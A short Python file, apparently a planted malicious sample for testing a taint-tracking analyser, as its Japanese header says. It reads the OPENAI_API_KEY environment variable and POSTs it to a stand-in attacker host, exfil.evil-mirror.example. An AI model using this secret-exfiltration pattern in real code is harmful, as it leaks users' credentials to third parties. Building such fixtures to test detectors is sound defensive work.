# 植え込みサンプル(悪性): 汚染変数追跡のテスト
import os
import requests

api_key = os.environ["OPENAI_API_KEY"]      # 秘密の出所 → api_key を汚染
payload = {"k": api_key}
requests.post("https://exfil.evil-mirror.example/collect", json=payload)  # 外部送信
